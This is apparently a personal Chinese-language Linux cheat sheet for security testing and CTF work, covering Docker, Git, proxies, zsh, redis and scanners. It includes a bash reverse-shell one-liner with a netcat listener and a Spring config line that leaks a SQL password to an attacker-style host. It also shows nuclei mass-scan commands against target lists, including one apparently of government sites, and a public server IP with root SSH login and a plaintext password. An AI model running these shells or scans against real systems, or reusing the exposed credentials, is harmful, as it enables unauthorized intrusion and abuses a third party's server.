# Linux-speed

* firewalld or ufw
* bash反弹shell
* Kali下更换Java8
* 代理设置总结
* Git
* Docker
* zsh
* searchsploit
* Apache
* SSH
* ps
* redis
* Go
* f8x
* curl
* rz文件传输
* find
* nuclei
* 查看文件

### firewalld

```bash
# ubuntu
systemctl status firewalld # 查看防火墙状态
systemctl stop firewalld # 关闭防火墙

# kali
systemctl status ufw # 查看防火墙状态
systemctl stop ufw # 关闭防火墙
```

### bash反弹shell

```bash
bash -c 'exec bash -i &>/dev/tcp/192.168.188.131/6789 <&1'

nc.exe -lvnp 6789
```

### Kali下更换Java8

下载地址：https://www.oracle.com/java/technologies/javase-jdk8-downloads.html

```bash
tar zxvf jdk-8u251-linux-x64.tar.gz
mv /usr/local/java/jdk1.8.0_251/ /opt/
gedit ~/.bashrc # 添加以下四行

# install JAVA JDK
export JAVA_HOME=/opt/jdk1.8.0_251
export CLASSPATH=.:${JAVA_HOME}/lib
export PATH=${JAVA_HOME}/bin:$PATH

source ~/.bashrc
java -version
```

### 代理设置总结

**增加代理**

```bash
export http_proxy="http://localhost:port"  //http代理
export https_proxy="http://localhost:port" //https代理
```

**取消代理**

```bash
unset http_proxy
unset https_proxy
```

**列出当前所有的环境变量**

```bash
export -p
```

**设置代理要连接到v2ray软件下的本机IP**

v2ray要允许来自局域网的连接

linux设置代理IP要为v2ray本机的IP地址 如192.168.0.112 10808

**安装proxychains代理**

```bash
curl -o f8x https://cdn.jsdelivr.net/gh/ffffffff0x/f8x@main/f8x
```

```bash
vim /etc/proxychains.conf

最后一行改为代理客户端的IP:端口

proxychains4 curl cip.cc
```

## Git常见命令

```bash
git config --list  # 检查配置信息
git config --global http.proxy #查看当前代理

git config --global user.name "username"
git config --global user.email user@xx.com
# 认证

git config --global http.proxy socks5://127.0.0.1:10808 #设置当前代理http
git config --global https.proxy socks5://127.0.0.1:10808 #设置当前代理https
git config --global --unset https.proxy  #删掉代理

git remote -v
git remote rm origin
git remote add origin git地址


# 上传题目三行命令
git pull # 需要先将远程仓库更新到本地
git add -A
git commit -m "xxxx"
git push
```

**resources**

[Git学习笔记大全](https://github.com/No-Github/1earn/blob/master/1earn/Develop/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md#push)

### Docker常见命令

https://blog.csdn.net/lhh134/article/details/84873821

**查找镜像**

```
docker search php
```

**拉取镜像**

```bash
docker pull xxxxx
```

**查看镜像**

```
docker images
```

**运行镜像映射端口8080**

```
docker run -d -p 8080:80 --name easysql ctftraining/suctf_2019_easysql
docker run -d -p 8080:8080 kitezzz/log4j2:latest
```

**查看所有运行的容器ID**

```
docker ps -a
```

**停止容器**

```
docker stop [continer ID]
```

**删掉镜像**

```
docker rmi (image id)
```

docker rm `docker images -q`

**删掉容器**

```
docker rm $(sudo docker ps -a -q)
docker rmi (container id)
 # 批量删掉
```

**进入容器**

```
docker exec -it (container id) /bin/sh   // 进入终端交互
交互模式中，使用 ctrl+p+q 退出交互 保持运行,使用 exit命令退出并停止容器。
```

**登录docker**

```
docker login
```

**打包镜像**

```
docker commit [containerID] [ImageName]
docker commit bb553cb40625 kitezzz/log4j2
```

**提交镜像到云仓库**

```
docker tag easysql1 kitezzz/xxxx
docker push kitezzz/xxx
```

**dockerfile文件使用**

```bash
docker build -t kitezzz/readfile:v1 -f ./test/Dockerfile .  # 注意点号必须有
```

**创建容器**

* 将src目录下的文件放到镜像中的/var/www/html目录下 docker cp xxx.txt 96f7f14e99ab:/var/www/html
* 下面这条命令并不能上传成功 ~~docker run -itd -v /src:/var/www/html -p 80:8080 php:7.0-apache~~

**docker搭建php+apache**

https://www.cnblogs.com/yyxianren/p/12082747.html

docker pull php:7.0-apache

**查看版本命令**

```bash
apachectl -v
php -v
cat /etc/issue #查看系统类型
```

**制作环境一把梭**

```
docker pull php:5.6-apache
docker images
docker run -d -p 8080:80 --name phpa php:

访问127.0.0.1:8080
docker ps -a
docker cp index.php 668d585f79a1:/var/www/html

docker ps -a

docker exec -it ca43cfae7b0d /bin/sh   // 进入终端交互
docker commit [containerID] [ImageName]
docker login
docker push kitezzz/xxx
```

### Ubuntu搭建zsh步骤

```bash
sudo apt-get install zsh
chsh -s /bin/zsh #把默认的Shell改成zsh
sudo vim /etc/passwd

proxychains4 curl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh 
reboot

sudo apt-get install autojump #自动跳转插件

git clone https://github.com/zsh-users/zsh-syntax-highlighting.git
echo "source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh" >> ${ZDOTDIR:-$HOME}/.zshrc ## 语法高亮插件
vim ~/.zshrc

source ~/.zshrc

https://github.com/ohmyzsh/ohmyzsh/wiki/External-themes ## 官方主题
```

**Resources && References**

* https://www.cnblogs.com/sddai/p/11185344.html

eureka.client.serviceUrl.defaultZone=http://value:${sql.password}@192.168.86.129:80

* https://mp.weixin.qq.com/s/RViKCbpYqBYYDofpHLTCKA

### searchsploit

* 使用kali的searchsploit查找一下漏洞利用POC

```bash
searchsploit thinkphp
```

* 进入该漏洞的文件46150.txt

```
cd /usr/share/exploitdb/exploits/php/webapps
cat 46150.txt
```

### Apache

\-docker 服务默认端口为8080 -apache 服务默认端口为80

```bash
192.168.10.128:8080 # 为docker服务
192.168.10.128:80 # 为apache2服务
```

**apache2 启动 重启 停止方法（这里以kali为例）**

```bash
service apache2 start # 启动
service apache2 stop # 停止
service apache2 restart # 重启
```

* kali下目录为/var/www/html
* php目录：/etc/php/7.3/apache2/php.ini
* 可在phpinfo中Loaded Configuration File看到

```
/etc/init.d/mysql start
```

### SSH

```bash
sudo apt-get install ssh
service ssh start
nmap your-ip -p 22
```

**xshell连不上linux ssh问题** 首先使用命令打开配置文件：leafpad /etc/ssh/sshd\_config 2、把AddressFamily any 前面的 # 删除 3、把PermitRootLogin yes 前面的 # 删除 4、把PasswordAuthentication yes 前面的 # 删除 5、重启ssh服务, service ssh restart

### redis

```bash
wget http://download.redis.io/releases/redis-4.0.10.tar.gz
tar xzf redis-4.0.10.tar.gz
mv redis-4.0.10 /usr/local/redis
cd /usr/local/redis
make

cd src
sudo cp redis-server /usr/bin
sudo cp redis-cli /usr/bin
cd ../
sudo cp redis.conf /etc/

redis-server /etc/redis.conf #启动环境
```

### Go

https://studygolang.com/dl

```bash
tar -xzf xx.tar.gz -C /usr/local
vim /etc/profile
export PATH=$PATH:/usr/local/go/bin
source /etc/profile
go version
```

```bash
# 更换国内能访问的代理
go env -w GOPROXY=https://goproxy.cn
```

### f8x

```bash
wget https://cdn.jsdelivr.net/gh/ffffffff0x/f8x@main/f8x

bash f8x -b  # 安装基本环境

python3 -m http.server
120.26.176.226:8000

ssh root@120.26.176.226
testtest1234!
```

### curl

\-X参数指定 HTTP 请求的方法

`curl -X POST https://www.example.com`

\-d参数用于发送 POST 请求的数据体

```bash
$ curl -d'login=emma＆password=123'-X POST https://google.com/login
# 或者
$ curl -d 'login=emma' -d 'password=123' -X POST  https://google.com/login
curl https://manager.cman.cmcm.com/login/login -k # 用于https协议
```

**resource** https://www.cnblogs.com/xingxia/p/linux\_curl.html

### rz

apt install lrzsz

### find

```
find / -name *flag*
find / -name flag.txt -exec cat '{}' \;
```

### nuclei

```bash

nuclei -l 2.txt -t ./template/ -o results.txt

nuclei -l 2.txt -t ./ -o results.txt

nuclei -l urls.txt -t ./template/swagger-api.yaml -o hw1.txt

nuclei -l zhengfu.txt -t ./template/thinkphp-509-information-disclosure.yaml -o zhengfu.txt

nuclei -l phpmywind.txt -t ./phpmywind-detect.yaml -no-update-templates
```

### 查看文件

```
head # 文件前十行
tail # 文件后十行
more # 分页查看
less # 逐行查看
vi # 查看编辑
```
